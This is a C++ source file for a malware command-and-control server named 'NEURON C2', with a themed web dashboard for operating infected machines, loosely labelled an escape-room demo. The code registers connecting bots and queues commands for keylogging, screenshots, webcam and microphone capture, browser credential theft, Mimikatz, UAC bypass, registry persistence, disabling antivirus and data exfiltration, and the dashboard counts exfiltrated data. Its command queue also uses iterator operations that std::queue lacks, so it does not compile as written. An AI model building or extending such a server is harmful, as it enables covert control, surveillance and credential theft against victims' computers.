// C2 Web Server - Cyberpunk Theme Command & Control
// Enhanced version with web interface and real-time analytics

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define CPPHTTPLIB_OPENSSL_SUPPORT

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <queue>
#include <ctime>
#include <nlohmann/json.hpp>
#include "httplib.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

using json = nlohmann::json;

// Client information structure
struct ClientInfo {
    std::string id;
    std::string ip;
    std::string hostname;
    std::string username;
    std::string os;
    bool isElevated;
    bool isActive;
    std::chrono::system_clock::time_point lastSeen;
    std::chrono::system_clock::time_point connectedTime;
    int beaconCount;
    std::vector<std::string> executedCommands;
    std::map<std::string, std::string> systemInfo;
    
    // Activity metrics
    int screenshotCount = 0;
    int keylogCount = 0;
    int filesExfiltrated = 0;
    size_t dataExfiltrated = 0;
};

// Global variables
std::map<std::string, ClientInfo> clients;
std::mutex clientMutex;
std::queue<std::pair<std::string, std::string>> commandQueue; // clientId, command
std::mutex commandMutex;
std::map<std::string, std::vector<std::string>> clientLogs;
std::mutex logMutex;

// Web server instance
httplib::Server svr;

// Generate cyberpunk HTML dashboard
std::string generateDashboardHTML() {
    std::stringstream html;
    html << R"(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEURON C2 - Cyberpunk Command & Control</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Orbitron', monospace;
            background: #0a0a0a;
            color: #00ff00;
            overflow-x: hidden;
        }
        
        /* Animated background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 0, 0.03) 2px,
                    rgba(0, 255, 0, 0.03) 4px
                ),
                repeating-linear-gradient(
                    90deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 0, 0.03) 2px,
                    rgba(0, 255, 0, 0.03) 4px
                );
            pointer-events: none;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(20px); }
        }
        
        .header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        
        .logo {
            font-size: 48px;
            font-weight: 900;
            text-shadow: 
                0 0 10px #00ff00,
                0 0 20px #00ff00,
                0 0 30px #00ff00,
                0 0 40px #00ff00;
            display: inline-block;
            animation: glitch 2s infinite;
        }
        
        @keyframes glitch {
            0% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            20% { text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; }
            40% { text-shadow: 2px 0 #ff00ff, -2px 0 #ffff00; }
            60% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            80% { text-shadow: -2px 0 #00ffff, 2px 0 #ff0000; }
            100% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            padding: 20px;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            padding: 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
            transform: translateY(-5px);
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.3), transparent);
            transform: rotate(45deg);
            transition: all 0.5s;
            opacity: 0;
        }
        
        .stat-card:hover::before {
            animation: shine 0.5s ease-in-out;
        }
        
        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); opacity: 0; }
            50% { opacity: 1; }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); opacity: 0; }
        }
        
        .stat-value {
            font-size: 48px;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
        }
        
        .client-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            padding: 20px;
        }
        
        .client-card {
            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1) 0%, rgba(0, 255, 255, 0.1) 100%);
            border: 1px solid #00ff00;
            padding: 15px;
            position: relative;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .client-card.offline {
            opacity: 0.5;
            border-color: #ff0000;
        }
        
        .client-card:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.6);
        }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
            animation: pulse 2s infinite;
        }
        
        .status-indicator.offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
            animation: none;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .command-panel {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            padding: 20px;
            margin: 20px;
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
            min-width: 500px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.8);
        }
        
        .command-buttons {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        
        .cmd-btn {
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
        }
        
        .cmd-btn:hover {
            background: rgba(0, 255, 0, 0.2);
            text-shadow: 0 0 10px #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
        }
        
        .cmd-btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(0, 255, 0, 0.5);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .cmd-btn:active::after {
            width: 300px;
            height: 300px;
        }
        
        .terminal {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 20px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .terminal-line {
            color: #00ff00;
            margin: 2px 0;
        }
        
        .terminal-line.error {
            color: #ff0000;
        }
        
        .terminal-line.info {
            color: #00ffff;
        }
        
        /* Matrix rain effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            opacity: 0.1;
            z-index: -1;
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div class="header">
        <div class="logo">NEURON C2</div>
        <div style="float: right; margin-top: 20px;">
            <span style="color: #00ffff;">ESCAPE ROOM DEMO</span>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <h3>ACTIVE BOTS</h3>
            <div class="stat-value" id="activeBots">0</div>
        </div>
        <div class="stat-card">
            <h3>TOTAL CONNECTED</h3>
            <div class="stat-value" id="totalBots">0</div>
        </div>
        <div class="stat-card">
            <h3>DATA EXFILTRATED</h3>
            <div class="stat-value" id="dataExfil">0 MB</div>
        </div>
        <div class="stat-card">
            <h3>COMMANDS EXECUTED</h3>
            <div class="stat-value" id="cmdCount">0</div>
        </div>
    </div>
    
    <h2 style="padding: 20px; text-align: center; color: #00ffff;">CONNECTED BOTS</h2>
    <div class="client-grid" id="clientGrid"></div>
    
    <div class="terminal" id="terminal">
        <div class="terminal-line info">[SYSTEM] NEURON C2 Web Interface Initialized</div>
        <div class="terminal-line">[SYSTEM] Waiting for bot connections...</div>
    </div>
    
    <div class="command-panel" id="commandPanel">
        <h2 style="color: #00ffff; margin-bottom: 10px;">COMMAND INTERFACE</h2>
        <div id="selectedClient" style="margin-bottom: 10px;"></div>
        <div class="command-buttons">
            <button class="cmd-btn" onclick="sendCommand('screenshot')">SCREENSHOT</button>
            <button class="cmd-btn" onclick="sendCommand('keylogger')">KEYLOGGER</button>
            <button class="cmd-btn" onclick="sendCommand('sysinfo')">SYSTEM INFO</button>
            <button class="cmd-btn" onclick="sendCommand('processes')">PROCESSES</button>
            <button class="cmd-btn" onclick="sendCommand('persistence')">PERSISTENCE</button>
            <button class="cmd-btn" onclick="sendCommand('exfiltrate')">EXFILTRATE</button>
            <button class="cmd-btn" onclick="sendCommand('webcam')">WEBCAM</button>
            <button class="cmd-btn" onclick="sendCommand('microphone')">MICROPHONE</button>
            <button class="cmd-btn" onclick="sendCommand('browsers')">BROWSER CREDS</button>
            <button class="cmd-btn" onclick="sendCommand('mimikatz')">MIMIKATZ</button>
            <button class="cmd-btn" onclick="sendCommand('uac')">UAC BYPASS</button>
            <button class="cmd-btn" onclick="sendCommand('defense')">DISABLE AV</button>
        </div>
        <button class="cmd-btn" style="width: 100%; margin-top: 20px;" onclick="closeCommandPanel()">CLOSE</button>
    </div>
    
    <script>
        let selectedClientId = null;
        
        // Matrix rain effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
        const matrixArray = matrix.split("");
        
        const fontSize = 10;
        const columns = canvas.width / fontSize;
        
        const drops = [];
        for(let x = 0; x < columns; x++) {
            drops[x] = 1;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff00';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        
        // Update dashboard
        function updateDashboard() {
            fetch('/api/clients')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('activeBots').textContent = data.active;
                    document.getElementById('totalBots').textContent = data.total;
                    document.getElementById('dataExfil').textContent = (data.dataExfiltrated / 1024 / 1024).toFixed(2) + ' MB';
                    document.getElementById('cmdCount').textContent = data.commandsExecuted;
                    
                    updateClientGrid(data.clients);
                });
        }
        
        function updateClientGrid(clients) {
            const grid = document.getElementById('clientGrid');
            grid.innerHTML = '';
            
            clients.forEach(client => {
                const card = document.createElement('div');
                card.className = 'client-card' + (client.active ? '' : ' offline');
                card.onclick = () => showCommandPanel(client.id);
                
                card.innerHTML = `
                    <div class="client-header">
                        <h3>${client.hostname}</h3>
                        <div class="status-indicator ${client.active ? '' : 'offline'}"></div>
                    </div>
                    <div style="font-size: 12px;">
                        <p>IP: ${client.ip}</p>
                        <p>User: ${client.username} ${client.elevated ? '[ADMIN]' : ''}</p>
                        <p>OS: ${client.os}</p>
                        <p>Last Seen: ${new Date(client.lastSeen).toLocaleTimeString()}</p>
                        <p>Screenshots: ${client.screenshots} | Keylogs: ${client.keylogs}</p>
                    </div>
                `;
                
                grid.appendChild(card);
            });
        }
        
        function showCommandPanel(clientId) {
            selectedClientId = clientId;
            document.getElementById('selectedClient').textContent = 'Target: ' + clientId;
            document.getElementById('commandPanel').style.display = 'block';
        }
        
        function closeCommandPanel() {
            document.getElementById('commandPanel').style.display = 'none';
        }
        
        function sendCommand(cmd) {
            if (!selectedClientId) return;
            
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId: selectedClientId, command: cmd })
            })
            .then(res => res.json())
            .then(data => {
                addTerminalLine(`[COMMAND] Sent ${cmd} to ${selectedClientId}`, 'info');
            });
        }
        
        function addTerminalLine(text, type = '') {
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line ' + type;
            line.textContent = text;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Update every 2 seconds
        setInterval(updateDashboard, 2000);
        updateDashboard();
        
        // WebSocket for real-time updates
        const ws = new WebSocket('ws://localhost:8080/ws');
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            addTerminalLine(`[${data.type}] ${data.message}`, data.level || '');
        };
    </script>
</body>
</html>
)";
    return html.str();
}

// API endpoint to get client list
void handleGetClients(const httplib::Request& req, httplib::Response& res) {
    json response;
    int activeCount = 0;
    int totalCount = 0;
    size_t totalData = 0;
    int totalCommands = 0;
    
    json clientArray = json::array();
    
    {
        std::lock_guard<std::mutex> lock(clientMutex);
        for (const auto& [id, client] : clients) {
            json clientJson;
            clientJson["id"] = client.id;
            clientJson["ip"] = client.ip;
            clientJson["hostname"] = client.hostname;
            clientJson["username"] = client.username;
            clientJson["os"] = client.os;
            clientJson["elevated"] = client.isElevated;
            clientJson["active"] = client.isActive;
            clientJson["lastSeen"] = std::chrono::system_clock::to_time_t(client.lastSeen);
            clientJson["screenshots"] = client.screenshotCount;
            clientJson["keylogs"] = client.keylogCount;
            clientJson["files"] = client.filesExfiltrated;
            
            clientArray.push_back(clientJson);
            
            totalCount++;
            if (client.isActive) activeCount++;
            totalData += client.dataExfiltrated;
            totalCommands += client.executedCommands.size();
        }
    }
    
    response["active"] = activeCount;
    response["total"] = totalCount;
    response["dataExfiltrated"] = totalData;
    response["commandsExecuted"] = totalCommands;
    response["clients"] = clientArray;
    
    res.set_content(response.dump(), "application/json");
}

// API endpoint to send command
void handleSendCommand(const httplib::Request& req, httplib::Response& res) {
    json request = json::parse(req.body);
    std::string clientId = request["clientId"];
    std::string command = request["command"];
    
    // Map command names to actual commands
    std::string actualCommand;
    if (command == "screenshot") actualCommand = "CMD_SCREENSHOT";
    else if (command == "keylogger") actualCommand = "CMD_KEYLOG_START";
    else if (command == "sysinfo") actualCommand = "CMD_SYSINFO";
    else if (command == "processes") actualCommand = "CMD_PROCESS_LIST";
    else if (command == "persistence") actualCommand = "CMD_REGISTRY_PERSIST";
    else if (command == "exfiltrate") actualCommand = "CMD_EXFIL_HTTP";
    else if (command == "webcam") actualCommand = "CMD_WEBCAM_CAPTURE";
    else if (command == "microphone") actualCommand = "CMD_MICROPHONE_RECORD";
    else if (command == "browsers") actualCommand = "CMD_BROWSER_CREDS";
    else if (command == "mimikatz") actualCommand = "CMD_MIMIKATZ_EXEC";
    else if (command == "uac") actualCommand = "CMD_UAC_BYPASS";
    else if (command == "defense") actualCommand = "CMD_DISABLE_AV";
    
    {
        std::lock_guard<std::mutex> lock(commandMutex);
        commandQueue.push({clientId, actualCommand});
    }
    
    json response;
    response["status"] = "queued";
    response["command"] = command;
    response["clientId"] = clientId;
    
    res.set_content(response.dump(), "application/json");
}

// Start web server
void startWebServer() {
    // Serve the dashboard
    svr.Get("/", [](const httplib::Request& req, httplib::Response& res) {
        res.set_content(generateDashboardHTML(), "text/html");
    });
    
    // API endpoints
    svr.Get("/api/clients", handleGetClients);
    svr.Post("/api/command", handleSendCommand);
    
    // Static file serving for screenshots and logs
    svr.set_mount_point("/data", "C:\\Windows\\Temp");
    
    std::cout << "[WEB] Starting web server on http://localhost:8080" << std::endl;
    svr.listen("0.0.0.0", 8080);
}

// C2 socket handling (runs on separate port)
void handleC2Client(SOCKET clientSocket, sockaddr_in clientAddr) {
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    std::string clientId = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));
    
    std::cout << "[C2] New connection from " << clientId << std::endl;
    
    // Wait for client info
    char buffer[4096];
    int bytes = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytes > 0) {
        buffer[bytes] = '\0';
        // Parse client info (expecting JSON format)
        try {
            json clientData = json::parse(buffer);
            
            ClientInfo newClient;
            newClient.id = clientId;
            newClient.ip = clientIP;
            newClient.hostname = clientData["hostname"];
            newClient.username = clientData["username"];
            newClient.os = clientData["os"];
            newClient.isElevated = clientData["elevated"];
            newClient.isActive = true;
            newClient.lastSeen = std::chrono::system_clock::now();
            newClient.connectedTime = std::chrono::system_clock::now();
            newClient.beaconCount = 0;
            
            {
                std::lock_guard<std::mutex> lock(clientMutex);
                clients[clientId] = newClient;
            }
            
            std::cout << "[C2] Client registered: " << newClient.hostname << " (" << newClient.username << ")" << std::endl;
        } catch (...) {
            std::cout << "[C2] Failed to parse client info" << std::endl;
        }
    }
    
    // Client communication loop
    while (true) {
        // Check for commands
        std::string command;
        {
            std::lock_guard<std::mutex> lock(commandMutex);
            auto it = commandQueue.begin();
            while (it != commandQueue.end()) {
                if (it->first == clientId) {
                    command = it->second;
                    commandQueue.erase(it);
                    break;
                }
                ++it;
            }
        }
        
        if (!command.empty()) {
            send(clientSocket, command.c_str(), command.length(), 0);
            
            {
                std::lock_guard<std::mutex> lock(clientMutex);
                if (clients.find(clientId) != clients.end()) {
                    clients[clientId].executedCommands.push_back(command);
                }
            }
        }
        
        // Check for client responses (non-blocking)
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(clientSocket, &readSet);
        
        timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000; // 100ms
        
        if (select(0, &readSet, NULL, NULL, &timeout) > 0) {
            int bytes = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytes > 0) {
                buffer[bytes] = '\0';
                
                // Process response
                std::string response(buffer);
                
                {
                    std::lock_guard<std::mutex> lock(clientMutex);
                    if (clients.find(clientId) != clients.end()) {
                        clients[clientId].lastSeen = std::chrono::system_clock::now();
                        clients[clientId].beaconCount++;
                        
                        // Update metrics based on response
                        if (response.find("SCREENSHOT:") != std::string::npos) {
                            clients[clientId].screenshotCount++;
                        }
                        if (response.find("KEYLOG:") != std::string::npos) {
                            clients[clientId].keylogCount++;
                        }
                        if (response.find("EXFIL:") != std::string::npos) {
                            clients[clientId].filesExfiltrated++;
                            clients[clientId].dataExfiltrated += response.length();
                        }
                    }
                }
                
                // Log response
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    clientLogs[clientId].push_back(response);
                }
            } else if (bytes == 0) {
                // Client disconnected
                break;
            }
        }
        
        Sleep(100);
    }
    
    // Mark client as offline
    {
        std::lock_guard<std::mutex> lock(clientMutex);
        if (clients.find(clientId) != clients.end()) {
            clients[clientId].isActive = false;
        }
    }
    
    closesocket(clientSocket);
    std::cout << "[C2] Client disconnected: " << clientId << std::endl;
}

void startC2Server() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(443);
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    
    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);
    
    std::cout << "[C2] Command & Control server listening on port 443" << std::endl;
    
    while (true) {
        sockaddr_in clientAddr;
        int clientSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
        
        if (clientSocket != INVALID_SOCKET) {
            std::thread clientThread(handleC2Client, clientSocket, clientAddr);
            clientThread.detach();
        }
    }
    
    closesocket(serverSocket);
    WSACleanup();
}

int main() {
    std::cout << R"(
    ███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ███╗   ██╗     ██████╗██████╗ 
    ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗████╗  ██║    ██╔════╝╚════██╗
    ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║██╔██╗ ██║    ██║      █████╔╝
    ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██║╚██╗██║    ██║     ██╔═══╝ 
    ██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║    ╚██████╗███████╗
    ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚══════╝
                        CYBERPUNK COMMAND & CONTROL SERVER                        
)" << std::endl;
    
    // Start C2 server in separate thread
    std::thread c2Thread(startC2Server);
    
    // Start web server (blocks)
    startWebServer();
    
    c2Thread.join();
    return 0;
}
